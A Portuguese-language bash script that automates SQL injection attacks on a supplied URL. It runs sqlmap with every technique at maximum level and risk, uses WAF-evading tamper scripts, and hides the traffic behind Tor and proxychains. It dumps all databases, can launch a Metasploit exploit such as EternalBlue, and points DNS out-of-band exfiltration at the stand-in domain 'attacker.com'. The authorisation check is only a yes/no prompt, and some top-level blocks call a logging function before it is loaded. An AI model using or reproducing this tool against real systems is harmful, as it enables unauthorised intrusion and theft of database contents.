#!/bin/bash
# SQL Injection Automation Script - Versão Melhorada
# Foco: Execução automática completa, todas as técnicas, integração com ferramentas do repositório
# Autor: Sistema Automatizado
# Data: $(date +%Y-%m-%d)

set -euo pipefail

# ============================================================================
# CONFIGURAÇÕES E VARIÁVEIS GLOBAIS
# ============================================================================

BASE_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
RESULT_DIR="$BASE_DIR/result"
LOG_DIR="$RESULT_DIR/logs"
RELATORIO_DIR="$RESULT_DIR/relatorio"
DUMP_DIR="$RESULT_DIR/dumps"
TIMESTAMP=$(date +%Y%m%d_%H%M%S)
RELATORIO_FILE="$RELATORIO_DIR/relatorio_${TIMESTAMP}.txt"
INJECTOR_DIR="$BASE_DIR/../Kali/Ferramentas/injector"

# Cores para output
RED='\033[0;31m'
GREEN='\033[0;32m'
YIGHLLOW='\033[1;33m'
BLUE='\033[0;34m'
MAGENTA='\033[0;35m'
CYAN='\033[0;36m'
NC='\033[0m' # No Color
BOLD='\033[1m'

# Variáveis de controle
PROXY=""
USE_TOR=false
USE_INJECTOR=false
OPERADOR=""
TARGET_URL=""
POST_DATA=""
TARGET_TYPE="" # "search" ou "login"
ALL_TECHNIQUES=true
PARALLEL_MODE=true
USE_WAF=false

# ============================================================================
# FUNÇÕES DE UTILIDADE
# ============================================================================

print_color() {
    local color=$1
    shift
    case $color in
        red) echo -e "${RED}$@${NC}";;
        green) echo -e "${GREEN}$@${NC}";;
        yellow) echo -e "${YELLOW}$@${NC}";;
        blue) echo -e "${BLUE}$@${NC}";;
        magenta) echo -e "${MAGENTA}$@${NC}";;
        cyan) echo -e "${CYAN}$@${NC}";;
        bold) echo -e "${BOLD}$@${NC}";;
        *) echo "$@";;
    esac
}

log() {
    local level=$1
    shift
    local message="$@"
    local timestamp=$(date '+%Y-%m-%d %H:%M:%S')
    echo "[$timestamp] [$level] $message" | tee -a "$LOG_DIR/main.log"
    
    case $level in
        ERROR|ERRO)
            echo "[$timestamp] [ERROR] $message" >> "$LOG_DIR/error.log"
            print_color red "[ERRO] $message"
            ;;
        SUCCESS|SUCESSO)
            echo "[$timestamp] [SUCCESS] $message" >> "$LOG_DIR/success.log"
            print_color green "[SUCESSO] $message"
            ;;
        WARNING|AVISO)
            echo "[$timestamp] [WARNING] $message" >> "$LOG_DIR/warning.log"
            print_color yellow "[AVISO] $message"
            ;;
        INFO)
            print_color cyan "[INFO] $message"
            ;;
    esac
}

# ============================================================================
# INICIALIZAÇÃO
# ============================================================================

init_directories() {
    mkdir -p "$RESULT_DIR" "$LOG_DIR" "$RELATORIO_DIR" "$DUMP_DIR"
    log "INFO" "Diretórios criados: $RESULT_DIR"
}

init_report() {
    {
        echo "╔══════════════════════════════════════════════════════════════╗"
        echo "║     RELATÓRIO DE SQL INJECTION AUTOMATIZADO                 ║"
        echo "╚══════════════════════════════════════════════════════════════╝"
        echo ""
        echo "Data/Hora: $(date '+%d/%m/%Y %H:%M:%S')"
        echo "Operador: $OPERADOR"
        echo "Autorização Legal: SIM"
        echo "Target: $TARGET_URL"
        echo "Tipo Detectado: $TARGET_TYPE"
        echo "═══════════════════════════════════════════════════════════════"
        echo ""
    } > "$RELATORIO_FILE"
}

# ============================================================================
# VERIFICAÇÃO E INSTALAÇÃO DE FERRAMENTAS
# ============================================================================

check_and_install_tool() {
    local tool=$1
    local install_cmd=$2
    local check_cmd=${3:-"command -v $tool"}
    
    if eval "$check_cmd" >/dev/null 2>&1; then
        log "SUCCESS" "$tool está instalado"
        return 0
    else
        log "WARNING" "$tool NÃO encontrado. Tentando instalar..."
        
        if [ "$EUID" -ne 0 ]; then
            log "ERROR" "Precisa de privilégios root para instalar $tool"
            return 1
        fi
        
        eval "$install_cmd"
        
        if eval "$check_cmd" >/dev/null 2>&1; then
            log "SUCCESS" "$tool instalado com sucesso"
            return 0
        else
            log "ERROR" "Falha ao instalar $tool"
            return 1
        fi
    fi
}

install_kali_tools() {
    log "INFO" "Verificando e instalando ferramentas do Kali Linux..."
    
    # Detectar distribuição
    if [ -f /etc/debian_version ]; then
        PKG_MANAGER="apt-get"
        UPDATE_CMD="$PKG_MANAGER update -qq"
        INSTALL_CMD="$PKG_MANAGER install -y"
    elif [ -f /etc/arch-release ]; then
        PKG_MANAGER="pacman"
        UPDATE_CMD="$PKG_MANAGER -Sy"
        INSTALL_CMD="$PKG_MANAGER -S --noconfirm"
    elif [ -f /etc/redhat-release ]; then
        PKG_MANAGER="yum"
        UPDATE_CMD="$PKG_MANAGER check-update"
        INSTALL_CMD="$PKG_MANAGER install -y"
    else
        log "WARNING" "Distribuição não reconhecida. Instalação manual pode ser necessária."
        return 1
    fi
    
    # Atualizar repositórios
    log "INFO" "Atualizando repositórios..."
    eval "$UPDATE_CMD" >/dev/null 2>&1 || true
    
    # SQLMap
    check_and_install_tool "sqlmap" "$INSTALL_CMD sqlmap" || {
        # Tentar instalação via pip se apt falhar
        if command -v pip3 >/dev/null 2>&1; then
            log "INFO" "Tentando instalar sqlmap via pip3..."
            pip3 install sqlmap >/dev/null 2>&1 || log "WARNING" "Falha ao instalar sqlmap via pip"
        fi
    }
    
    # Tor
    check_and_install_tool "tor" "$INSTALL_CMD tor" || true
    
    # Proxychains
    if ! command -v proxychains4 >/dev/null 2>&1 && ! command -v proxychains >/dev/null 2>&1; then
        log "INFO" "Instalando proxychains..."
        eval "$INSTALL_CMD proxychains4" >/dev/null 2>&1 || eval "$INSTALL_CMD proxychains" >/dev/null 2>&1 || true
    fi
    
    # Docker (para injector)
    if [ -d "$INJECTOR_DIR" ]; then
        if ! command -v docker >/dev/null 2>&1; then
            log "INFO" "Instalando Docker para usar injector..."
            if [ "$PKG_MANAGER" = "apt-get" ]; then
                curl -fsSL https://get.docker.com -o /tmp/get-docker.sh
                sh /tmp/get-docker.sh >/dev/null 2>&1 || true
            else
                eval "$INSTALL_CMD docker" >/dev/null 2>&1 || true
            fi
        fi
    fi
    
    # Verificar serviços
    if command -v systemctl >/dev/null 2>&1; then
        if systemctl is-active --quiet tor 2>/dev/null; then
            log "SUCCESS" "Serviço Tor está rodando"
            USE_TOR=true
        else
            log "WARNING" "Tor não está rodando. Iniciando..."
            systemctl start tor 2>/dev/null || log "WARNING" "Não foi possível iniciar Tor"
        fi
    fi
}

check_tools() {
    log "INFO" "Verificando ferramentas disponíveis..."
    
    local tools_ok=true
    
    # SQLMap é obrigatório
    if ! command -v sqlmap >/dev/null 2>&1; then
        log "ERROR" "SQLMap é obrigatório mas não foi encontrado!"
        tools_ok=false
    fi
    
    # Proxychains
    if command -v proxychains4 >/dev/null 2>&1; then
        PROXY="proxychains4"
        log "SUCCESS" "Proxychains4 encontrado"
    elif command -v proxychains >/dev/null 2>&1; then
        PROXY="proxychains"
        log "SUCCESS" "Proxychains encontrado"
    else
        log "WARNING" "Proxychains não encontrado - anonimato reduzido"
    fi
    
    # Injector
    if [ -f "$INJECTOR_DIR/injector.sh" ]; then
        if command -v docker >/dev/null 2>&1; then
            USE_INJECTOR=true
            log "SUCCESS" "Injector encontrado e Docker disponível"
        else
            log "WARNING" "Injector encontrado mas Docker não está disponível"
        fi
    else
        log "INFO" "Injector não encontrado no repositório"
    fi
    
    if [ "$tools_ok" = false ]; then
        log "ERROR" "Ferramentas essenciais faltando. Abortando."
        exit 1
    fi
}

# ============================================================================
# OPSEC E ANONIMATO
# ============================================================================

opsec_check() {
    log "INFO" "Realizando verificação OPSEC..."
    
    {
        echo "═══════════════════════════════════════════════════════════════"
        echo "VERIFICAÇÃO OPSEC - $(date)"
        echo "═══════════════════════════════════════════════════════════════"
    } >> "$LOG_DIR/opsec.log"
    
    # Verificar Tor
    if command -v tor >/dev/null 2>&1; then
        if systemctl is-active --quiet tor 2>/dev/null || pgrep -x tor >/dev/null; then
            log "SUCCESS" "Tor está rodando"
            USE_TOR=true
            echo "[OPSEC] Tor: ATIVO" >> "$LOG_DIR/opsec.log"
        else
            log "WARNING" "Tor encontrado mas não está rodando"
            echo "[OPSEC] Tor: INSTALADO MAS INATIVO" >> "$LOG_DIR/opsec.log"
        fi
    else
        log "WARNING" "Tor não encontrado"
        echo "[OPSEC] Tor: NÃO INSTALADO" >> "$LOG_DIR/opsec.log"
    fi
    
    # Verificar Proxychains
    if [ -n "$PROXY" ]; then
        log "SUCCESS" "Proxychains disponível: $PROXY"
        echo "[OPSEC] Proxychains: $PROXY" >> "$LOG_DIR/opsec.log"
    else
        log "WARNING" "Proxychains não disponível"
        echo "[OPSEC] Proxychains: NÃO DISPONÍVEL" >> "$LOG_DIR/opsec.log"
    fi
    
    # Verificar IP atual
    local current_ip=$(curl -s --max-time 5 https://ifconfig.me 2>/dev/null || echo "N/A")
    log "INFO" "IP atual: $current_ip"
    echo "[OPSEC] IP Atual: $current_ip" >> "$LOG_DIR/opsec.log"
    
    echo "[OPSEC] Recomendação: Use VPN antes de iniciar testes" >> "$LOG_DIR/opsec.log"
    echo "═══════════════════════════════════════════════════════════════" >> "$LOG_DIR/opsec.log"
}

# ====== AUDITORIA E LEGALIDADE ======
# Solicita arquivo digital de autorização
print_color yellow "Anexe o arquivo digital de autorização (PDF/JPG/PNG):"
read -e -p "Caminho do arquivo de autorização: " AUTH_FILE
if [ ! -f "$AUTH_FILE" ]; then
    log_jsonl ERROR "Arquivo de autorização não encontrado: $AUTH_FILE" | tee -a "$LOG_DIR/auditoria.jsonl"
    print_color red "Arquivo de autorização obrigatório. Abortando."
    exit 1
fi

# Solicita número de autorização, responsável e tempo de retenção
read -p "Número do processo/autorização: " AUTH_NUMBER
read -p "Responsável legal: " AUTH_RESP
read -p "Tempo de retenção dos dados (ex: 90 dias): " AUTH_RETENTION

# Coleta IP e hash da máquina
source "$BASE_DIR/lib/opsec.sh"
OP_IP=$(get_operator_ip)
MACHINE_HASH=$(get_machine_hash)

# Registra auditoria inicial em JSONL
source "$BASE_DIR/lib/log.sh"
log_jsonl INFO "Início da auditoria. Operador: $OPERADOR, IP: $OP_IP, Hash: $MACHINE_HASH, Autorização: $AUTH_NUMBER, Responsável: $AUTH_RESP, Retenção: $AUTH_RETENTION, Arquivo: $AUTH_FILE" | tee -a "$LOG_DIR/auditoria.jsonl"

# Gera hash SHA256 do arquivo de autorização
AUTH_FILE_HASH=$(sha256sum "$AUTH_FILE" | awk '{print $1}')
log_jsonl INFO "Hash do arquivo de autorização: $AUTH_FILE_HASH" | tee -a "$LOG_DIR/auditoria.jsonl"

# ============================================================================
# DETECÇÃO AUTOMÁTICA DE PARÂMETROS
# ============================================================================

detect_url_type() {
    local url="$1"
    
    log "INFO" "Analisando URL: $url"
    
    # Detectar parâmetros comuns de pesquisa
    local search_params="search|query|q|keyword|term|find|lookup"
    # Detectar parâmetros comuns de login
    local login_params="user|username|email|login|pass|password|pwd|auth"
    
    # Verificar na URL
    if echo "$url" | grep -qiE "($search_params)="; then
        TARGET_TYPE="search"
        log "SUCCESS" "Tipo detectado: PESQUISA (parâmetros de busca encontrados)"
        return 0
    elif echo "$url" | grep -qiE "($login_params)="; then
        TARGET_TYPE="login"
        log "SUCCESS" "Tipo detectado: LOGIN (parâmetros de autenticação encontrados)"
        return 0
    fi
    
    # Se não detectou, perguntar ou assumir pesquisa
    log "WARNING" "Tipo não detectado automaticamente. Assumindo: PESQUISA"
    TARGET_TYPE="search"
}

extract_parameters() {
    local url="$1"
    
    # Extrair parâmetros GET da URL
    if echo "$url" | grep -q "?"; then
        local params=$(echo "$url" | sed 's/.*?//' | tr '&' '\n')
        log "INFO" "Parâmetros GET detectados:"
        echo "$params" | while read param; do
            [ -n "$param" ] && log "INFO" "  - $param"
        done
    fi
    
    # Verificar se há dados POST
    if [ -n "$POST_DATA" ]; then
        log "INFO" "Dados POST fornecidos: $POST_DATA"
    fi
}

# ============================================================================
# EXECUÇÃO DE TÉCNICAS SQL INJECTION
# ============================================================================

run_sqlmap_technique() {
    local url="$1"
    local technique="$2"
    local technique_code="$3"
    local extra_params="${4:-}"
    local technique_name="$5"
    
    local log_file="$LOG_DIR/sqlmap_${technique}.log"
    local output_file="$RESULT_DIR/sqlmap_${technique}_${TIMESTAMP}.txt"
    
    log "INFO" "Executando técnica: $technique_name"
    echo "" >> "$RELATORIO_FILE"
    echo "═══════════════════════════════════════════════════════════════" >> "$RELATORIO_FILE"
    echo "TÉCNICA: $technique_name" >> "$RELATORIO_FILE"
    echo "Hora de início: $(date '+%H:%M:%S')" >> "$RELATORIO_FILE"
    echo "═══════════════════════════════════════════════════════════════" >> "$RELATORIO_FILE"
    
    # Construir comando SQLMap
    local sqlmap_cmd="sqlmap -u \"$url\""
    
    # Adicionar dados POST se houver
    if [ -n "$POST_DATA" ]; then
        if [ -f "$POST_DATA" ]; then
            sqlmap_cmd="$sqlmap_cmd -r \"$POST_DATA\""
        else
            sqlmap_cmd="$sqlmap_cmd --data \"$POST_DATA\""
        fi
    fi
    
    # Adicionar técnica específica
    sqlmap_cmd="$sqlmap_cmd --technique=$technique_code"
    
    # Parâmetros padrão
    sqlmap_cmd="$sqlmap_cmd --batch --level=5 --risk=3 --threads=10"
    sqlmap_cmd="$sqlmap_cmd --random-agent --tamper=space2comment,charencode"
    sqlmap_cmd="$sqlmap_cmd --output-dir=\"$RESULT_DIR\""
    sqlmap_cmd="$sqlmap_cmd --dump-format=CSV"
    
    # Adicionar parâmetros extras
    if [ -n "$extra_params" ]; then
        sqlmap_cmd="$sqlmap_cmd $extra_params"
    fi
    
    # Usar proxy se disponível
    if [ -n "$PROXY" ] && [ "$USE_TOR" = true ]; then
        sqlmap_cmd="$PROXY $sqlmap_cmd --tor --tor-type=SOCKS5 --check-tor"
    fi
    
    # Executar
    log "INFO" "Comando: $sqlmap_cmd"
    echo "Comando executado: $sqlmap_cmd" >> "$log_file"
    echo "═══════════════════════════════════════════════════════════════" >> "$log_file"
    
    local start_time=$(date +%s)
    
    if eval "$sqlmap_cmd" >> "$log_file" 2>&1; then
        local end_time=$(date +%s)
        local duration=$((end_time - start_time))
        
        # Analisar resultados
        if grep -qi "is vulnerable\|is injectable\|available databases" "$log_file"; then
            log "SUCCESS" "$technique_name: VULNERABILIDADE DETECTADA!"
            echo "[SUCESSO] $technique_name: Vulnerabilidade detectada!" >> "$RELATORIO_FILE"
            echo "Tempo de execução: ${duration}s" >> "$RELATORIO_FILE"
            
            # Extrair informações relevantes
            grep -i "available databases\|database:\|table:\|column:" "$log_file" | head -20 >> "$RELATORIO_FILE" || true
            
            return 0
        elif grep -qi "not injectable\|not vulnerable" "$log_file"; then
            log "INFO" "$technique_name: Não vulnerável"
            echo "[INFO] $technique_name: Não vulnerável a esta técnica" >> "$RELATORIO_FILE"
            return 1
        else
            log "WARNING" "$technique_name: Resultado inconclusivo"
            echo "[AVISO] $technique_name: Resultado inconclusivo - verifique logs" >> "$RELATORIO_FILE"
            return 2
        fi
    else
        log "ERROR" "$technique_name: Erro na execução"
        echo "[ERRO] $technique_name: Erro durante execução" >> "$RELATORIO_FILE"
        return 3
    fi
}

run_all_techniques() {
    log "INFO" "Iniciando execução de TODAS as técnicas SQL Injection..."
    
    declare -A TECHNIQUES=(
        ["E"]="Error-Based"
        ["U"]="Union-Based"
        ["B"]="Boolean-Based"
        ["T"]="Time-Based"
        ["S"]="Stacked-Queries"
        ["Q"]="Inline-Queries"
    )
    
    declare -A RESULTS
    
    # Executar todas as técnicas
    for code in "${!TECHNIQUES[@]}"; do
        local name="${TECHNIQUES[$code]}"
        
        if [ "$PARALLEL_MODE" = true ]; then
            run_sqlmap_technique "$TARGET_URL" "${name,,}" "$code" "" "$name" &
            RESULTS["$name"]="Em execução..."
        else
            run_sqlmap_technique "$TARGET_URL" "${name,,}" "$code" "" "$name"
            local result=$?
            case $result in
                0) RESULTS["$name"]="VULNERÁVEL" ;;
                1) RESULTS["$name"]="Não vulnerável" ;;
                2) RESULTS["$name"]="Inconclusivo" ;;
                *) RESULTS["$name"]="Erro" ;;
            esac
        fi
    done
    
    # Aguardar processos paralelos
    if [ "$PARALLEL_MODE" = true ]; then
        log "INFO" "Aguardando conclusão de todas as técnicas..."
        wait
        
        # Analisar resultados finais
        for code in "${!TECHNIQUES[@]}"; do
            local name="${TECHNIQUES[$code]}"
            local log_file="$LOG_DIR/sqlmap_${name,,}.log"
            
            if [ -f "$log_file" ]; then
                if grep -qi "is vulnerable\|is injectable" "$log_file"; then
                    RESULTS["$name"]="VULNERÁVEL"
                elif grep -qi "not injectable" "$log_file"; then
                    RESULTS["$name"]="Não vulnerável"
                else
                    RESULTS["$name"]="Inconclusivo"
                fi
            else
                RESULTS["$name"]="Não executado"
            fi
        done
    fi
    
    # Adicionar técnicas avançadas
    log "INFO" "Testando técnicas avançadas..."
    
    # OOB (Out-of-Band)
    if command -v dnschef >/dev/null 2>&1 || command -v nc >/dev/null 2>&1; then
        log "INFO" "Testando OOB (requer servidor externo)..."
        run_sqlmap_technique "$TARGET_URL" "oob" "O" "--dns-domain=attacker.com" "OOB" || true
    fi
    
    # Second-Order (requer URL de segunda ordem)
    log "INFO" "Second-Order requer URL específica - pulando por enquanto"
    
    # Gerar resumo
    echo "" >> "$RELATORIO_FILE"
    echo "═══════════════════════════════════════════════════════════════" >> "$RELATORIO_FILE"
    echo "RESUMO DAS TÉCNICAS EXECUTADAS" >> "$RELATORIO_FILE"
    echo "═══════════════════════════════════════════════════════════════" >> "$RELATORIO_FILE"
    
    for tech in "${!RESULTS[@]}"; do
        echo "- $tech: ${RESULTS[$tech]}" >> "$RELATORIO_FILE"
        log "INFO" "$tech: ${RESULTS[$tech]}"
    done
}

# ============================================================================
# INTEGRAÇÃO COM INJECTOR
# ============================================================================

run_injector() {
    if [ "$USE_INJECTOR" != true ]; then
        log "INFO" "Injector não disponível - pulando"
        return 1
    fi
    
    log "INFO" "Executando injector.sh do repositório..."
    
    local injector_log="$LOG_DIR/injector.log"
    
    echo "" >> "$RELATORIO_FILE"
    echo "═══════════════════════════════════════════════════════════════" >> "$RELATORIO_FILE"
    echo "EXECUÇÃO COM INJECTOR (Docker)" >> "$RELATORIO_FILE"
    echo "═══════════════════════════════════════════════════════════════" >> "$RELATORIO_FILE"
    
    cd "$INJECTOR_DIR"
    
    # Verificar se Docker está rodando
    if ! docker ps >/dev/null 2>&1; then
        log "WARNING" "Docker não está rodando. Tentando iniciar..."
        if command -v systemctl >/dev/null 2>&1; then
            systemctl start docker 2>/dev/null || log "ERROR" "Não foi possível iniciar Docker"
        fi
    fi
    
    # Executar injector
    if [ -n "$POST_DATA" ]; then
        bash injector.sh -u "$TARGET_URL" -r "$POST_DATA" >> "$injector_log" 2>&1 &
    else
        bash injector.sh -u "$TARGET_URL" >> "$injector_log" 2>&1 &
    fi
    
    local injector_pid=$!
    log "INFO" "Injector iniciado (PID: $injector_pid)"
    echo "Injector PID: $injector_pid" >> "$RELATORIO_FILE"
    
    # Aguardar um pouco e verificar status
    sleep 5
    if ps -p $injector_pid > /dev/null; then
        log "SUCCESS" "Injector está rodando"
        echo "Status: Em execução" >> "$RELATORIO_FILE"
    else
        log "WARNING" "Injector pode ter terminado rapidamente"
        echo "Status: Verifique logs" >> "$RELATORIO_FILE"
    fi
    
    cd "$BASE_DIR"
}

# ============================================================================
# EXTRAÇÃO DE DADOS
# ============================================================================

dump_databases() {
    log "INFO" "Tentando extrair bancos de dados..."
    
    local dump_log="$LOG_DIR/dump.log"
    
    # Procurar por bancos detectados nos logs
    local dbs_found=false
    
    for log_file in "$LOG_DIR"/sqlmap_*.log; do
        if [ -f "$log_file" ]; then
            local databases=$(grep -i "available databases\|database:" "$log_file" | grep -oE "[a-zA-Z0-9_]+" | head -10)
            if [ -n "$databases" ]; then
                dbs_found=true
                echo "$databases" | while read db; do
                    [ -n "$db" ] && log "INFO" "Banco detectado: $db"
                done
            fi
        fi
    done
    
    if [ "$dbs_found" = true ]; then
        log "INFO" "Executando dump completo..."
        
        local dump_cmd="sqlmap -u \"$TARGET_URL\" --dbs --dump-all --batch"
        
        if [ -n "$POST_DATA" ]; then
            if [ -f "$POST_DATA" ]; then
                dump_cmd="$dump_cmd -r \"$POST_DATA\""
            else
                dump_cmd="$dump_cmd --data \"$POST_DATA\""
            fi
        fi
        
        if [ -n "$PROXY" ] && [ "$USE_TOR" = true ]; then
            dump_cmd="$PROXY $dump_cmd --tor --tor-type=SOCKS5"
        fi
        
        dump_cmd="$dump_cmd --output-dir=\"$DUMP_DIR\""
        
        log "INFO" "Executando dump: $dump_cmd"
        eval "$dump_cmd" >> "$dump_log" 2>&1 || log "WARNING" "Dump pode ter falhado - verifique logs"
    else
        log "WARNING" "Nenhum banco detectado para dump"
    fi
}

# ====== DETECÇÃO E BYPASS DE WAF ======
read -p "Deseja ativar detecção e bypass de WAF? (s/n): " USE_WAF
WAF_OPTS=""
if [[ "$USE_WAF" =~ ^[sS]$ ]]; then
    WAF_OPTS="--identify-waf --delay=2 --retries=3 --random-agent"
    print_color yellow "Detecção de WAF ativada. Bypass e auto-retry configurados."
fi

# ====== PARSE PROFISSIONAL DE OUTPUT SQLMAP (JSON) ======
parse_sqlmap_json_results() {
    local outdir="$1"
    for jsonfile in "$outdir"/output*/log.json; do
        if [ -f "$jsonfile" ]; then
            jq -c '.results[] | {type, value, dbms, dbms_version, os, technique, data}' "$jsonfile" | tee -a "$LOG_DIR/sqlmap_results.jsonl"
        fi
    done
}

# ====== LOGS CSV CORPORATIVO ======
export_results_csv() {
    local outdir="$1"
    local csvfile="$LOG_DIR/sqlmap_results.csv"
    echo "target,technique,dbms,dbms_version,os,type,value" > "$csvfile"
    for jsonfile in "$outdir"/output*/log.json; do
        if [ -f "$jsonfile" ]; then
            jq -r '.results[] | [.target,.technique,.dbms,.dbms_version,.os,.type,.value] | @csv' "$jsonfile" >> "$csvfile"
        fi
    done
}

# ====== INTEGRAÇÃO METASPLOIT ======
read -p "Deseja rodar módulos do Metasploit após SQLi? (s/n): " USE_METASPLOIT
if [[ "$USE_METASPLOIT" =~ ^[sS]$ ]]; then
    read -p "Digite o módulo/metasploit resource script (ex: exploit/windows/smb/ms17_010_eternalblue): " MSF_MODULE
    read -p "Digite o IP/host do alvo para o Metasploit: " MSF_TARGET
    msfconsole -q -x "use $MSF_MODULE; set RHOSTS $MSF_TARGET; run; exit"
fi

# ============================================================================
# RELATÓRIO FINAL
# ============================================================================

generate_final_report() {
    log "INFO" "Gerando relatório final..."
    
    {
        echo ""
        echo "═══════════════════════════════════════════════════════════════"
        echo "RELATÓRIO FINAL"
        echo "═══════════════════════════════════════════════════════════════"
        echo ""
        echo "Data/Hora de conclusão: $(date '+%d/%m/%Y %H:%M:%S')"
        echo ""
        echo "Arquivos gerados:"
        echo "  - Logs: $LOG_DIR"
        echo "  - Resultados: $RESULT_DIR"
        echo "  - Dumps: $DUMP_DIR"
        echo ""
        echo "═══════════════════════════════════════════════════════════════"
        echo "FIM DO RELATÓRIO"
        echo "═══════════════════════════════════════════════════════════════"
    } >> "$RELATORIO_FILE"
    
    # Ao final do relatório, gera hash SHA256
    FINAL_HASH=$(sha256sum "$RELATORIO_FILE" | awk '{print $1}')
    log_jsonl INFO "Hash do relatório final: $FINAL_HASH" | tee -a "$LOG_DIR/auditoria.jsonl"
    
    log "SUCCESS" "Relatório salvo em: $RELATORIO_FILE"
    print_color bold "═══════════════════════════════════════════════════════════════"
    print_color bold "Relatório completo disponível em:"
    print_color green "$RELATORIO_FILE"
    print_color bold "═══════════════════════════════════════════════════════════════"
}

# ============================================================================
# FUNÇÃO PRINCIPAL
# ============================================================================

main() {
    clear
    print_color bold "╔══════════════════════════════════════════════════════════════╗"
    print_color bold "║  SQL INJECTION AUTOMATIZADO - VERSÃO MELHORADA               ║"
    print_color bold "║  Execução completa de todas as técnicas                     ║"
    print_color bold "╚══════════════════════════════════════════════════════════════╝"
    echo ""
    
    # Inicialização
    init_directories
    
    # Verificação legal
    print_color yellow "⚠️  AVISO LEGAL ⚠️"
    read -p "Você tem autorização legal para realizar este teste? (s/n): " AUTORIZACAO
    if [[ ! "$AUTORIZACAO" =~ ^[sS]$ ]]; then
        log "ERROR" "Autorização legal é obrigatória. Abortando."
        exit 1
    fi
    
    # Nome do operador
    read -p "Digite o nome do operador: " OPERADOR
    [ -z "$OPERADOR" ] && OPERADOR="Anônimo"
    
    # Instalar ferramentas se necessário
    print_color cyan "Deseja instalar/verificar ferramentas automaticamente? (s/n): "
    read -p "" INSTALL_TOOLS
    if [[ "$INSTALL_TOOLS" =~ ^[sS]$ ]]; then
        install_kali_tools
    fi
    
    # Verificar ferramentas
    check_tools
    
    # OPSEC
    opsec_check
    
    # URL do alvo
    echo ""
    print_color cyan "═══════════════════════════════════════════════════════════════"
    print_color bold "ENTRADA DO ALVO"
    print_color cyan "═══════════════════════════════════════════════════════════════"
    read -p "Digite a URL vulnerável (com parâmetros de pesquisa/login): " TARGET_URL
    TARGET_URL=$(echo "$TARGET_URL" | xargs)
    
    if [[ -z "$TARGET_URL" ]]; then
        log "ERROR" "URL inválida. Abortando."
        exit 1
    fi
    
    # Dados POST (opcional)
    read -p "Dados POST (ou arquivo de requisição HTTP). Deixe vazio se não houver: " POST_DATA
    POST_DATA=$(echo "$POST_DATA" | xargs)
    
    # Detectar tipo
    detect_url_type "$TARGET_URL"
    extract_parameters "$TARGET_URL"
    
    # Inicializar relatório
    init_report
    
    # Executar todas as técnicas
    echo ""
    print_color bold "Iniciando execução de TODAS as técnicas SQL Injection..."
    print_color yellow "Isso pode levar vários minutos..."
    echo ""
    
    run_all_techniques
    
    # Executar injector em paralelo
    if [ "$USE_INJECTOR" = true ]; then
        echo ""
        log "INFO" "Iniciando injector em paralelo..."
        run_injector &
    fi
    
    # Aguardar conclusão
    wait
    
    # Tentar dump se vulnerável
    dump_databases
    
    # Relatório final
    generate_final_report
    
    log "SUCCESS" "Processo concluído! Verifique os resultados em: $RESULT_DIR"
}

# Executar
main "$@"
